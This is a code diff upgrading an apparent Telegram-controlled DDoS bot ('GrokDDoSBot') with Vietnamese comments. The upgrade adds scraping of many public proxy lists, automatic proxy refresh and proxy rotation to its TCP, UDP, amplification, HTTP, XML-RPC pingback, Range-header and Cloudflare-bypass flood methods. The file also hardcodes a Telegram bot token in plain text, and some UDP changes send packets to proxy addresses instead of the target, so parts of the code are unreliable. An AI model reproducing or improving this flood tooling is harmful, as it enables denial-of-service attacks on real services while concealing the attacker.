@@ -38,7 +38,7 @@ ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
 # Hằng số
-__version__ = "GrokDDoSBot 5.0 - Siêu Tăng Cường & Tối Ưu"
+__version__ = "GrokDDoSBot 6.0 - Siêu Proxy & Tối Ưu"
 PROXY_LIST = set()
 ATTACK_HISTORY = []
 CONFIG_FILE = Path("config.json")
@@ -48,7 +48,7 @@ METHODS = {
     "LAYER7": {"GET", "POST", "CFB", "XMLRPC", "BOT", "APACHE", "SLOW", "TOR", "DGB", "OVH", "PPS"}
 }
 
-# Biến đồng bộ sử dụng Lock thay vì threading.Value
+# Biến đồng bộ sử dụng Lock
 class Counter:
     def __init__(self, initial_value: int = 0):
         self.value = initial_value
@@ -72,7 +72,7 @@ BYTES_SENT = Counter(0)
 # Cấu hình mặc định
 if not CONFIG_FILE.exists():
     with open(CONFIG_FILE, "w") as f:
-        json.dump({"PROXY_TIMEOUT": 5, "THREAD_LIMIT": 1000, "MAX_CPU_USAGE": 80}, f)
+        json.dump({"PROXY_TIMEOUT": 5, "THREAD_LIMIT": 1000, "MAX_CPU_USAGE": 80, "PROXY_REFRESH_INTERVAL": 300}, f)
 
 with open(CONFIG_FILE, "r") as f:
     config = json.load(f)
@@ -98,69 +98,93 @@ def humanformat(num: int, precision: int = 2) -> str:
         return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
     return str(num)
 
-# Lấy proxy động từ các trang web miễn phí với thuật toán chọn lọc
+# Quản lý proxy với nhiều nguồn hơn
 def fetch_proxies() -> Set[str]:
     global PROXY_LIST
-    urls = [
+    proxy_sources = [
         "https://www.freeproxylists.net/",
         "https://www.sslproxies.org/",
         "https://free-proxy-list.net/",
         "https://spys.one/free-proxy-list/",
+        "https://www.proxy-list.download/api/v1/get?type=http",
+        "https://www.proxy-list.download/api/v1/get?type=socks4",
+        "https://www.proxy-list.download/api/v1/get?type=socks5",
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
     ]
     PROXY_LIST.clear()
     scraper = cloudscraper.create_scraper()
     
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(scrape_proxy_page, url, scraper) for url in urls]
+    with ThreadPoolExecutor(max_workers=min(15, len(proxy_sources))) as executor:
+        futures = [executor.submit(scrape_proxy_source, url, scraper) for url in proxy_sources]
         for future in as_completed(futures):
             PROXY_LIST.update(future.result())
     
-    # Kiểm tra và lọc proxy dựa trên độ trễ
+    # Lọc proxy chất lượng cao
     active_proxies = set()
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {executor.submit(check_proxy_latency, proxy): proxy for proxy in PROXY_LIST}
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(check_proxy_quality, proxy): proxy for proxy in PROXY_LIST}
         for future in as_completed(futures):
             proxy = futures[future]
             if future.result():
                 active_proxies.add(proxy)
     
     PROXY_LIST = active_proxies
-    logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy hoạt động với độ trễ thấp.")
+    logger.info(f"Đã lấy được {len(PROXY_LIST)} proxy chất lượng cao từ {len(proxy_sources)} nguồn.")
     return PROXY_LIST
 
-def scrape_proxy_page(url: str, scraper) -> Set[str]:
+def scrape_proxy_source(url: str, scraper) -> Set[str]:
     proxies = set()
     try:
         response = scraper.get(url, timeout=config["PROXY_TIMEOUT"])
-        soup = BeautifulSoup(response.text, 'html.parser')
-        for row in soup.find_all('tr')[1:]:
-            cols = row.find_all('td')
-            if len(cols) > 1:
-                ip = cols[0].text.strip()
-                port = cols[1].text.strip()
-                if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip) and port.isdigit():
-                    proxies.add(f"{ip}:{port}")
+        if "proxyscrape" in url or "proxy-list.download" in url:
+            proxies.update(line.strip() for line in response.text.splitlines() if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line.strip()))
+        elif "TheSpeedX" in url or "clarketm" in url:
+            proxies.update(line.strip() for line in response.text.splitlines() if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", line.strip()))
+        else:
+            soup = BeautifulSoup(response.text, 'html.parser')
+            for row in soup.find_all('tr')[1:]:
+                cols = row.find_all('td')
+                if len(cols) > 1:
+                    ip = cols[0].text.strip()
+                    port = cols[1].text.strip()
+                    if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip) and port.isdigit():
+                        proxies.add(f"{ip}:{port}")
     except Exception as e:
         logger.error(f"Lỗi khi lấy proxy từ {url}: {e}")
     return proxies
 
-def check_proxy_latency(proxy: str) -> bool:
+def check_proxy_quality(proxy: str) -> bool:
     try:
         ip, port = proxy.split(":")
         start_time = time.time()
         with socket.socket(AF_INET, SOCK_STREAM) as s:
             s.settimeout(config["PROXY_TIMEOUT"])
             s.connect((ip, int(port)))
+            s.send(b"HEAD / HTTP/1.1\r\nHost: example.com\r\n\r\n")
+            s.recv(1024)  # Kiểm tra phản hồi
         latency = (time.time() - start_time) * 1000  # ms
-        return latency < 500  # Chỉ giữ proxy có độ trễ dưới 500ms
+        return latency < 300  # Chỉ giữ proxy có độ trễ dưới 300ms
     except:
         return False
+
+# Tự động cập nhật proxy trong quá trình tấn công
+def auto_refresh_proxies():
+    while True:
+        time.sleep(config["PROXY_REFRESH_INTERVAL"])
+        fetch_proxies()
+        logger.info("Danh sách proxy đã được làm mới tự động.")
 
 # Tạo gói tin với phân mảnh
 def generate_packet(size: int = 1024, fragment: bool = False) -> bytes:
     data = random.randbytes(random.randint(size, size * 4))
-    if fragment and len(data) > 1480:  # MTU phổ biến
-        return data[:1480]  # Phân mảnh thành gói nhỏ
+    if fragment and len(data) > 1480:
+        return data[:1480]
     return data
 
 def generate_spoof_ip() -> str:
@@ -193,7 +217,7 @@ def validate_target(target: str, layer: str) -> Tuple[str, int] | None:
             port = int(port)
             if not (1 <= port <= 65535):
                 raise ValueError("Cổng không hợp lệ")
-            socket.inet_aton(ip)  # Kiểm tra định dạng IP
+            socket.inet_aton(ip)
             return ip, port
         elif layer == "LAYER7":
             if not target.startswith("http"):
@@ -237,10 +261,15 @@ class Layer4Attack(threading.Thread):
         self.event.clear()
         logger.info("Đã dừng tấn công.")
 
+    def select_proxy(self) -> str | None:
+        if not self.proxies:
+            self.proxies = fetch_proxies()
+        return random.choice(list(self.proxies)) if self.proxies else None
+
     def tcp_flood(self):
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 with socket.socket(AF_INET, SOCK_STREAM) as s:
                     s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                     s.settimeout(1)
@@ -263,12 +292,14 @@ class Layer4Attack(threading.Thread):
     def udp_flood(self):
         while self.event.is_set():
             try:
+                proxy = self.select_proxy()
                 with socket.socket(AF_INET, SOCK_DGRAM) as s:
                     data = generate_packet(4096, fragment=True)
+                    target = (proxy.split(":")[0], int(proxy.split(":")[1])) if proxy else self.target
                     while self.event.is_set():
                         REQUESTS_SENT.increment()
                         BYTES_SENT.increment(len(data))
-                        s.sendto(data, self.target)
+                        s.sendto(data, target)
                         time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
@@ -303,11 +334,13 @@ class Layer4Attack(threading.Thread):
         payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'
         while self.event.is_set():
             try:
+                proxy = self.select_proxy()
                 with socket.socket(AF_INET, SOCK_DGRAM) as s:
+                    target = (proxy.split(":")[0], int(proxy.split(":")[1])) if proxy else self.target
                     for _ in range(10):
                         REQUESTS_SENT.increment()
                         BYTES_SENT.increment(len(payload))
-                        s.sendto(payload, self.target)
+                        s.sendto(payload, target)
                         time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
@@ -316,11 +349,13 @@ class Layer4Attack(threading.Thread):
         payload = b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00'
         while self.event.is_set():
             try:
+                proxy = self.select_proxy()
                 with socket.socket(AF_INET, SOCK_DGRAM) as s:
+                    target = (proxy.split(":")[0], int(proxy.split(":")[1])) if proxy else self.target
                     for _ in range(10):
                         REQUESTS_SENT.increment()
                         BYTES_SENT.increment(len(payload))
-                        s.sendto(payload, self.target)
+                        s.sendto(payload, target)
                         time.sleep(random.uniform(0.005, 0.05))
             except:
                 pass
@@ -369,6 +404,11 @@ class Layer7Attack(threading.Thread):
         logger.info("Đã dừng tấn công.")
         self.save_history()
 
+    def select_proxy(self) -> str | None:
+        if not self.proxies:
+            self.proxies = fetch_proxies()
+        return random.choice(list(self.proxies)) if self.proxies else None
+
     def generate_headers(self) -> dict:
         return {
             "User-Agent": random.choice(self.user_agents),
@@ -387,7 +427,7 @@ class Layer7Attack(threading.Thread):
         headers = self.generate_headers()
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
@@ -402,7 +442,7 @@ class Layer7Attack(threading.Thread):
         data = {"data": base64.b64encode(random.randbytes(random.randint(1024, 2048)).hex().encode()).decode()}
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.post(self.url, headers=headers, json=data, proxies=proxies, timeout=5) as r:
@@ -417,7 +457,7 @@ class Layer7Attack(threading.Thread):
         headers = self.generate_headers()
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with scraper.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
@@ -432,7 +472,7 @@ class Layer7Attack(threading.Thread):
         data = f"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{random.randbytes(128).hex()}</string></value></param><param><value><string>{random.randbytes(128).hex()}</string></value></param></params></methodCall>"
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.post(self.url, headers=headers, data=data, proxies=proxies, timeout=5) as r:
@@ -446,7 +486,7 @@ class Layer7Attack(threading.Thread):
         headers = {"User-Agent": random.choice(self.user_agents)}
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(f"{self.url}/robots.txt", headers=headers, proxies=proxies, timeout=5) as r:
@@ -462,7 +502,7 @@ class Layer7Attack(threading.Thread):
         range_header = f"Range: bytes=0-,{','.join(f'5-{i}' for i in range(1, 1024))}"
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(self.url, headers={**headers, "Range": range_header}, proxies=proxies, timeout=5) as r:
@@ -475,7 +515,7 @@ class Layer7Attack(threading.Thread):
         headers = self.generate_headers()
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 with requests.Session() as s:
                     for _ in range(random.randint(50, 100)):
@@ -494,7 +534,7 @@ class Layer7Attack(threading.Thread):
         headers = self.generate_headers()
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(tor_url, headers=headers, proxies=proxies, timeout=5) as r:
@@ -507,7 +547,7 @@ class Layer7Attack(threading.Thread):
         headers = self.generate_headers()
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 with cloudscraper.create_scraper() as s:
                     s.get(self.url, headers=headers, proxies=proxies, timeout=5)
@@ -522,7 +562,7 @@ class Layer7Attack(threading.Thread):
         headers = self.generate_headers()
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(5, 10)):
                     with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
@@ -535,7 +575,7 @@ class Layer7Attack(threading.Thread):
         headers = {"User-Agent": random.choice(self.user_agents)}
         while self.event.is_set():
             try:
-                proxy = random.choice(list(self.proxies)) if self.proxies else None
+                proxy = self.select_proxy()
                 proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                 for _ in range(random.randint(50, 100)):
                     with requests.get(self.url, headers=headers, proxies=proxies, timeout=5) as r:
@@ -666,6 +706,9 @@ async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # Hàm chính
 def main():
+    # Khởi động luồng tự động làm mới proxy
+    threading.Thread(target=auto_refresh_proxies, daemon=True).start()
+    
     application = Application.builder().token("7270463906:AAGO8qT3MSy0Wm3hZTWi4QNMXqOkkISgsC0").build()
     
     application.add_handler(CommandHandler("start", start))
@@ -676,7 +719,7 @@ def main():
     application.add_handler(CommandHandler("methods", methods))
     application.add_handler(CommandHandler("history", history))
     
-    logger.info("Bot đã khởi động.")
+    logger.info("Bot đã khởi động với hỗ trợ proxy nâng cao.")
     application.run_polling()
 
 if __name__ == "__main__":
